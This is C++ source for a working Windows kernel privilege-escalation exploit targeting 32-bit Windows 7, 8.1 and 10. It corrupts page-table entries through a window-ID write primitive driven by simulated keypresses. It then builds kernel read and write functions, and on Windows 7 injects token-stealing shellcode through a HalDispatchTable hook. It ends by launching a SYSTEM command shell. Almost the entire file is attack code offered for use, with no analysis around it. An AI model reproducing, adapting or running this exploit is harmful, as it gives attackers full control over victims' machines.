#include <windows.h>
#include <wchar.h>
#include <stdlib.h>
#include <stdio.h>
#include <Lm.h>
#include <thread>

#pragma comment(lib, "netapi32.lib")

#define get(v, i) ((v >> 8*(i)) & 0xff) 

unsigned char sc_KPROCESS;
unsigned char sc_APLINKS;
unsigned char sc_TOKEN;
unsigned char sc_UPID;

typedef enum _SYSTEM_INFORMATION_CLASS {
	SystemModuleInformation = 11,
	SystemHandleInformation = 16
} SYSTEM_INFORMATION_CLASS;

typedef NTSTATUS(WINAPI *NtQuerySystemInformation_t)(IN SYSTEM_INFORMATION_CLASS SystemInformationClass,
	OUT PVOID                   SystemInformation,
	IN ULONG                    SystemInformationLength,
	OUT PULONG ReturnLength);

typedef NTSTATUS(WINAPI *NtQueryIntervalProfile_t)(IN ULONG   ProfileSource,
	OUT PULONG Interval);

NtQuerySystemInformation_t NtQuerySystemInformation;
NtQueryIntervalProfile_t NtQueryIntervalProfile;

ULONG PDPT3 = 0xC0603010; //0xC0603010;// 0xC0603000; // -> PDE(0xc0600000)
ULONG PDPT4 = 0xC0603018; //self reference
ULONG PDPT3_PDE = 0xC0602000; // *PDPT3 -> PDPT3_PDE 

BOOLEAN is_run = FALSE;
BOOLEAN is_run2 = FALSE;
int _sim_key_down(WORD wKey)
{
	INPUT stInput = { 0 };

	do
	{
		stInput.type = INPUT_KEYBOARD;
		stInput.ki.wVk = wKey;
		stInput.ki.dwFlags = 0;

		SendInput(1, &stInput, sizeof(stInput));

	} while (FALSE);

	return 0;
}

int _sim_key_up(WORD wKey)
{
	INPUT stInput = { 0 };

	do
	{
		stInput.type = INPUT_KEYBOARD;
		stInput.ki.wVk = wKey;
		stInput.ki.dwFlags = KEYEVENTF_KEYUP;

		SendInput(1, &stInput, sizeof(stInput));

	} while (FALSE);

	return 0;
}
int _sim_alt_shift_esc()
{
	int i = 0;

	do
	{
		_sim_key_down(VK_MENU);
		_sim_key_down(VK_SHIFT);


		_sim_key_down(VK_ESCAPE);
		_sim_key_up(VK_ESCAPE);
		Sleep(5);
		_sim_key_down(VK_ESCAPE);
		_sim_key_up(VK_ESCAPE);

		_sim_key_up(VK_MENU);
		_sim_key_up(VK_SHIFT);


	} while (FALSE);

	return 0;
}
int _sim_alt_shift_tab(int nCount)
{
	int i = 0;
	HWND hWnd = NULL;


	int nFinalRet = -1;

	do
	{
		_sim_key_down(VK_MENU);
		_sim_key_down(VK_SHIFT);


		for (i = 0; i < nCount; i++)
		{
			_sim_key_down(VK_TAB);
			_sim_key_up(VK_TAB);

			Sleep(5);

		}


		_sim_key_up(VK_MENU);
		_sim_key_up(VK_SHIFT);
	} while (FALSE);

	return nFinalRet;
}

BOOL th_end = FALSE;
std::thread th;
void thread_shift()
{
	while (!th_end)
	{
		_sim_alt_shift_esc();
		_sim_alt_shift_esc();
		Sleep(50);
	}
}

int or_address_value_4(__in void* pAddress)
{
	WNDCLASSEXW stWC = { 0 };

	HWND	hWndParent = NULL;
	HWND	hWndChild = NULL;

	WCHAR*	pszClassName = L" ";
	WCHAR*	pszTitleName = L" ";
	UINT64 value = 0;

	void*	pId = NULL;
	MSG		stMsg = { 0 };

	do
	{
		stWC.cbSize = sizeof(stWC);
		stWC.lpfnWndProc = DefWindowProcW;
		stWC.lpszClassName = pszClassName;

		if (0 == RegisterClassExW(&stWC))
		{
			break;
		}

		int width = GetSystemMetrics(SM_CXSCREEN);
		int height = GetSystemMetrics(SM_CYSCREEN);

		hWndParent = CreateWindowExW(
			WS_EX_TOOLWINDOW,
			pszClassName,
			NULL,
			WS_OVERLAPPED | WS_VISIBLE,
			width,
			height,
			0,
			0,
			NULL,
			NULL,
			GetModuleHandleW(NULL),
			NULL
		);

		if (NULL == hWndParent)
		{
			break;
		}

		hWndChild = CreateWindowExW(
			0,
			pszClassName,
			pszTitleName,
			WS_OVERLAPPED | WS_VISIBLE | WS_CHILD,
			width,
			height,
			0,
			0,
			hWndParent,
			NULL,
			GetModuleHandleW(NULL),
			NULL
		);

		if (NULL == hWndChild)
			break;

#ifdef _WIN64
		pId = ((UCHAR*)pAddress - 0x28);
#else
		pId = ((UCHAR*)pAddress - 0x14);
#endif // #ifdef _WIN64

		SetWindowLongPtr(hWndChild, GWLP_ID, (LONG_PTR)pId);

		SetParent(hWndChild, GetDesktopWindow());

		SetForegroundWindow(hWndChild);
		_sim_alt_shift_tab(1);

		SwitchToThisWindow(hWndChild, TRUE);
		SetWindowPos(hWndChild, 0, width, height, 0, 0, 0);
		_sim_alt_shift_esc();

		int stage2 = 0;
		int count = 1;
		while (GetMessage(&stMsg, NULL, 0, 0))
		{
			SetFocus(hWndParent);
			_sim_alt_shift_esc();
			SetFocus(hWndChild);
			_sim_alt_shift_esc();
			Sleep(10);
			SetFocus(hWndParent);
			_sim_alt_shift_esc();
			SetFocus(hWndChild);
			_sim_alt_shift_esc();

			TranslateMessage(&stMsg);
			DispatchMessage(&stMsg);

			__try {
				Sleep(0x1);
				if (stage2 == 0)
				{
					value = *(ULONG *)PDPT4;
					printf("1. PDPT4 %p\n", value);
					pId = ((UCHAR*)PDPT3 - 0x14);
					SetWindowLongPtr(hWndChild, GWLP_ID, (LONG_PTR)pId);
					stage2 = 1;
				}

				value = *(ULONG *)PDPT3_PDE;
				printf("2. PDPT3_PDE %p", value);
				th_end = TRUE;
				break;
			}
			__except (EXCEPTION_EXECUTE_HANDLER) {
				continue;
			}

		}

	} while (FALSE);

	if (NULL != hWndParent)
	{
		DestroyWindow(hWndParent);
		hWndParent = NULL;
	}

	if (NULL != hWndChild)
	{
		DestroyWindow(hWndChild);
		hWndChild = NULL;
	}

	UnregisterClassW(pszClassName, GetModuleHandleW(NULL));

	return 0;
}

FARPROC WINAPI KernelSymbolInfo(LPCSTR lpSymbolName)
{
	typedef enum _SYSTEM_INFORMATION_CLASS {
		SystemBasicInformation = 0,
		SystemPerformanceInformation = 2,
		SystemTimeOfDayInformation = 3,
		SystemProcessInformation = 5,
		SystemProcessorPerformanceInformation = 8,
		SystemModuleInformation = 11,
		SystemInterruptInformation = 23,
		SystemExceptionInformation = 33,
		SystemRegistryQuotaInformation = 37,
		SystemLookasideInformation = 45
	} SYSTEM_INFORMATION_CLASS;

	typedef struct _SYSTEM_MODULE_INFORMATION_ENTRY {
		HANDLE Section;
		PVOID MappedBase;
		PVOID ImageBase;
		ULONG ImageSize;
		ULONG Flags;
		USHORT LoadOrderIndex;
		USHORT InitOrderIndex;
		USHORT LoadCount;
		USHORT OffsetToFileName;
		UCHAR FullPathName[256];
	} SYSTEM_MODULE_INFORMATION_ENTRY, *PSYSTEM_MODULE_INFORMATION_ENTRY;

	typedef struct _SYSTEM_MODULE_INFORMATION {
		ULONG NumberOfModules;
		SYSTEM_MODULE_INFORMATION_ENTRY Module[1];
	} SYSTEM_MODULE_INFORMATION, *PSYSTEM_MODULE_INFORMATION;

	typedef NTSTATUS(NTAPI *_NtQuerySystemInformation)(
		SYSTEM_INFORMATION_CLASS SystemInformationClass,
		PVOID SystemInformation,
		ULONG SystemInformationLength,
		PULONG ReturnLength
		);

	DWORD len;
	PSYSTEM_MODULE_INFORMATION ModuleInfo;
	LPVOID kernelBase = NULL;
	PUCHAR kernelImage = NULL;
	HMODULE hUserSpaceKernel;
	UCHAR* lpKernelName = NULL;
	FARPROC pUserKernelSymbol = NULL;
	FARPROC pLiveFunctionAddress = NULL;

	_NtQuerySystemInformation NtQuerySystemInformation = (_NtQuerySystemInformation)
		GetProcAddress(GetModuleHandle(L"ntdll.dll"), "NtQuerySystemInformation");
	if (NtQuerySystemInformation == NULL) {
		return NULL;
	}

	NtQuerySystemInformation(SystemModuleInformation, NULL, 0, &len);
	ModuleInfo = (PSYSTEM_MODULE_INFORMATION)VirtualAlloc(NULL, len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (!ModuleInfo)
	{
		return NULL;
	}

	NtQuerySystemInformation(SystemModuleInformation, ModuleInfo, len, &len);

	kernelBase = ModuleInfo->Module[0].ImageBase;
	kernelImage = ModuleInfo->Module[0].FullPathName;

	/* Find exported Kernel Functions */
	lpKernelName = ModuleInfo->Module[0].FullPathName + ModuleInfo->Module[0].OffsetToFileName;

	hUserSpaceKernel = LoadLibraryExA((LPCSTR)lpKernelName, 0, 0);
	if (hUserSpaceKernel == NULL)
	{
		VirtualFree(ModuleInfo, 0, MEM_RELEASE);
		return NULL;
	}

	pUserKernelSymbol = GetProcAddress(hUserSpaceKernel, lpSymbolName);
	if (pUserKernelSymbol == NULL)
	{
		VirtualFree(ModuleInfo, 0, MEM_RELEASE);
		return NULL;
	}

	pLiveFunctionAddress = (FARPROC)((PUCHAR)pUserKernelSymbol - (PUCHAR)hUserSpaceKernel + (PUCHAR)kernelBase);
	FreeLibrary(hUserSpaceKernel);
	VirtualFree(ModuleInfo, 0, MEM_RELEASE);

	return pLiveFunctionAddress;
}

int DetectOSAndSetVerOffsets() {

	DWORD dwMajor, dwMinor;
	LPWKSTA_INFO_100 pBuf = NULL;
	if (NERR_Success != NetWkstaGetInfo(NULL, 100, (LPBYTE*)&pBuf))
		return FALSE;
	dwMajor = pBuf->wki100_ver_major;
	dwMinor = pBuf->wki100_ver_minor;

	if (dwMajor == 6 && dwMinor == 1) {
		return 7;
	}
	else if (dwMajor == 6 && dwMinor == 3) {
		return 81;
	}
	else if (dwMajor == 10 && dwMinor == 0) {
		return 10;
	}
	else
	{
		return 0;
	}
}

ULONG GetHalDispatchTable() {
	LPCSTR lpWriteTargetName = "HalDispatchTable";
	FARPROC fpWriteTarget = NULL;
	fpWriteTarget = KernelSymbolInfo(lpWriteTargetName);

	return (ULONG)fpWriteTarget;
}

unsigned int get_pxe_32(unsigned int addr)
{
	unsigned int result = (addr >> 12);
	result *= 8;
	return 0xc0000000 | result;
}

ULONG look_free_entry_PDE(void) {
	// Looks for a free PDE
	int offset = 0;
	ULONG search = PDPT3_PDE + offset;
	while (offset < 0x1000) //512 * 8byte 
	{
		// This is a NULL (free) entry
		if ((*(PVOID *)search) == 0x0)
		{
			break;
		}
		offset += 8;
		search = PDPT3_PDE + offset;
	}
	return search;
}

ULONG calculate_spurious_pt_address(ULONG spurious_offset) {
	ULONG index = (spurious_offset & 0xFFF) / 8;

	//0b11 000000010 _________ 000000000000
	return 0xc0400000 | (index << 12);
}

ULONG calculate_spurious_large_pt_address(ULONG spurious_offset) {
	ULONG index = (spurious_offset & 0xFFF) / 8;

	//0b10 _________ 000000000 000000000000
	return 0x80000000 | (index << 21);
}

UINT64 g_custom_PDE = NULL;
ULONG create_spurious_pte_to_virtual_address(ULONG virtual_address, BOOL nx_off = FALSE, BOOL reuse = FALSE) {
	UINT64 pte = get_pxe_32(virtual_address);
	unsigned int pte_offset = pte & 0xFFF;
	printf("\nPTE: %p, %x\n", pte, pte_offset);

	UINT64 pde = get_pxe_32(pte);
	unsigned int pde_offset = pde & 0xFFF;
	printf("PDE: %p, %x\n", pde, pde_offset);

	UINT64 pdpte = get_pxe_32(pde);
	unsigned int pdpte_offset = pdpte & 0xFFF;
	printf("PDPTE: %p, %x\n", pdpte, pdpte_offset);

	printf("-------- suprious PDE --------- \n");
	UINT64 custom_PDE;
	if (reuse)
	{
		if (g_custom_PDE == NULL)
		{
			g_custom_PDE = look_free_entry_PDE();
		}
		custom_PDE = g_custom_PDE;
	}
	else
	{
		custom_PDE = look_free_entry_PDE();
	}
	printf("[+] custom_PDE : %p\n", custom_PDE);
	UINT64 custom_PDE_PT = calculate_spurious_pt_address(custom_PDE);
	printf("[+] custom_PDE_PT : %p\n", custom_PDE_PT);

	//Get PDE Physical Address
	UINT64 pde_PA = *(UINT64*)pdpte;
	printf("[+] pde_PA : %p\n", pde_PA);
	Sleep(0x1); // Sleep for TLB refresh;

	//Get PTE Physical Address
	*(UINT64*)custom_PDE = pde_PA | 0x67;;
	UINT64 pte_PA = *(UINT64*)(custom_PDE_PT + pde_offset);
	printf("[+] pte_PA : %p\n", pte_PA);
	Sleep(0x1); // Sleep for TLB refresh;

	//Large Page
	if (pte_PA & 128)
	{
		printf("[+] Large Page !\n");
		printf("[+] custom_PDE_LargePT : %p\n", custom_PDE_PT);
		UINT64 custom_PDE_LargePT = calculate_spurious_large_pt_address(custom_PDE);

		//Physical memory read, write Setting
		*(UINT64*)custom_PDE = pte_PA | 0x67;
		if (nx_off)
			*(UINT64*)custom_PDE &= 0x7fffffffffffffff;	//unset NX bit

		return custom_PDE_LargePT | (virtual_address & 0x1fffff);
	}

	//Get DATA Physical Address
	*(UINT64*)custom_PDE = pte_PA | 0x67;;
	UINT64 data_PA = *(UINT64*)(custom_PDE_PT + pte_offset);
	Sleep(0x1); // Sleep for TLB refresh;

				//Physical memory read, write Setting
	*(UINT64*)custom_PDE = data_PA | 0x67;
	if (nx_off)
		*(UINT64*)custom_PDE &= 0x7fffffffffffffff;	//unset NX bit

	return custom_PDE_PT | (virtual_address & 0xfff);
}

ULONG get_OverwriteAddress_pointer(ULONG target_address, ULONG target_offset) {
	printf("[*] Getting Overwrite pointer: %lx\n", target_address);
	ULONG OverwriteAddress = create_spurious_pte_to_virtual_address(target_address, FALSE);
	printf("OverwriteAddress: %lx\n", OverwriteAddress);
	return (ULONG) *((PVOID *)(((char *)OverwriteAddress) + target_offset));
}

void overwrite_TargetAddress(ULONG hook_address, ULONG target_address, ULONG target_offset) {
	ULONG OverwriteTarget = create_spurious_pte_to_virtual_address(target_address, FALSE);
	ULONG target = (ULONG)((char *)OverwriteTarget) + target_offset;
	printf("Patch OverwriteTarget: %lx with %lx\n", target, hook_address);
	*(ULONG *)target = (ULONG)hook_address;
}

ULONG store_shellcode_in_hal(ULONG store_addr, ULONG func_table, ULONG origin_value) {
	unsigned char shellcode[] =
	{
		0x51, //push ecx
		0x60,// pushad
		0x33,0xC0,                                                   // XOR EAX, EAX                 Zero out EAX (EAX = 0)
		0x64,0x8B,0x80,0x24,0x01,0x00,0x00,                          // MOV EAX, FS:[EAX+0x124]      Retrieve current _KTHREAD structure
		0x8B,0x40,sc_KPROCESS,                                // MOV EAX, [EAX+_KPROCESS]     Retrieve _EPROCESS structure
		0x8B,0xC8,                                                   // MOV ECX, EAX                 Copy EAX (_EPROCESS) to ECX
		0x8B,0x98,sc_TOKEN,0x00,0x00,0x00,                    // MOV EBX, [EAX+_TOKEN]        Retrieve current _TOKEN
		0x8B,0x80,sc_APLINKS,0x00,0x00,0x00,                  // MOV EAX, [EAX+_APLINKS] <-|  Retrieve FLINK from ActiveProcessLinks
		0x81,0xE8,sc_APLINKS,0x00,0x00,0x00,                  // SUB EAX, _APLINKS         |  Retrieve EPROCESS from ActiveProcessLinks
		0x81,0xB8,sc_UPID,0x00,0x00,0x00,0x04,0x00,0x00,0x00, // CMP [EAX+_UPID], 0x4      |  Compare UniqueProcessId with 4 (System Process)
		0x75,0xE8,                                                   // JNZ/JNE                ----  Jump if not zero/not equal
		0x8B,0x90,sc_TOKEN,0x00,0x00,0x00,                    // MOV EDX, [EAX+_TOKEN]        Copy SYSTEM _TOKEN to EDX
		0x8B,0xC1,                                                   // MOV EAX, ECX                 Copy ECX (current process _TOKEN) to EAX
		0x89,0x90,sc_TOKEN,0x00,0x00,0x00,                    // MOV [EAX+_TOKEN], EDX        Copy SYSTEM _TOKEN to current process _TOKEN
		0x61, //popad

		0xb8, get(origin_value, 0),get(origin_value, 1),get(origin_value, 2),get(origin_value, 3),       //mov eax, origin pointer
		0xb9, get(func_table, 0),get(func_table, 1),get(func_table, 2),get(func_table, 3),			   //mov ecx, (target_base + target_offset)
		0x89, 0x01,                     //mov DWORD PTR [ecx], eax
		0x59,						 //pop ecx
		0xff, 0xe0                     //jmp eax
	};

	ULONG spurious_dest = create_spurious_pte_to_virtual_address(store_addr, TRUE);

	memcpy(((char *)spurious_dest), shellcode, sizeof(shellcode));
	return spurious_dest;
}

ULONG kread(ULONG target)
{
	ULONG OverwriteAddress = create_spurious_pte_to_virtual_address(target, FALSE, TRUE);
	return *(ULONG*)OverwriteAddress;
}
void kwrite(ULONG target, ULONG value)
{
	ULONG OverwriteAddress = create_spurious_pte_to_virtual_address(target, FALSE, TRUE);
	*(ULONG*)OverwriteAddress = value;
}

int main()
{
	TCHAR pre_username[256];
	TCHAR post_username[256];
	DWORD size = 256;
	int osversion;
	int overwrite_offset;
	ULONG overwrite_address;
	HRESULT result;

	osversion = DetectOSAndSetVerOffsets();
	if (osversion == 7)
	{
		printf("   [+] Windows 7 SP1\n");
		sc_KPROCESS = 0x50;
		sc_APLINKS = 0xb8;
		sc_TOKEN = 0xf8;
		sc_UPID = 0xb4;

		overwrite_address = GetHalDispatchTable();  // HalDispatchTable
		overwrite_offset = 0x4;      				// QueryIntervalProfile   
	}
	else if (osversion == 81)
	{
		printf("   [+] Windows 8.1 \n");
		sc_APLINKS = 0xb8;
		sc_TOKEN = 0xec;
		sc_UPID = 0xb4;
	}
	else if (osversion == 10)
	{
		printf("   [+] Windows 10 \n");
		sc_APLINKS = 0xb8;
		sc_TOKEN = 0xf4;
		sc_UPID = 0xb4;
	}
	else
	{
		return 0;
	}

	th = std::thread(thread_shift);
	or_address_value_4((void*)PDPT4);
	th.join();
	
	if (osversion == 7)
	{
		ULONG original_pointer = get_OverwriteAddress_pointer(overwrite_address, overwrite_offset);
		ULONG sh_addr = store_shellcode_in_hal(0xffd00d50, overwrite_address + overwrite_offset, original_pointer);
		overwrite_TargetAddress(sh_addr, overwrite_address, overwrite_offset);

		// Exploit Win7
		HMODULE hNtDll = NULL;
		ULONG Interval = 0;
		hNtDll = LoadLibrary(L"ntdll.dll");

		if (!hNtDll) {
			exit(EXIT_FAILURE);
		}
		NtQueryIntervalProfile = (NtQueryIntervalProfile_t)GetProcAddress(hNtDll, "NtQueryIntervalProfile");

		if (!NtQueryIntervalProfile) {
			exit(EXIT_FAILURE);
		}

		NtQueryIntervalProfile(0x1337, &Interval);
	}
	else
	{
		ULONG  PsInitialSystemProcess;
		ULONG pEPROCESS, nextEPROCESS;
		ULONG UniqueProcessId;

		PsInitialSystemProcess = (ULONG)KernelSymbolInfo("PsInitialSystemProcess");
		pEPROCESS = kread(PsInitialSystemProcess);
		ULONG system_token = kread(pEPROCESS + sc_TOKEN);

		while (1)
		{
			nextEPROCESS = kread(pEPROCESS + sc_APLINKS) - sc_APLINKS;

			UniqueProcessId = kread(nextEPROCESS + sc_UPID);

			if (GetCurrentProcessId() == UniqueProcessId)
			{
				kwrite(nextEPROCESS + sc_TOKEN, system_token);
				break;
			}
			pEPROCESS = nextEPROCESS;
		}
	}

	Sleep(100);
	WinExec("cmd.exe", SW_SHOW);
	return 0;
}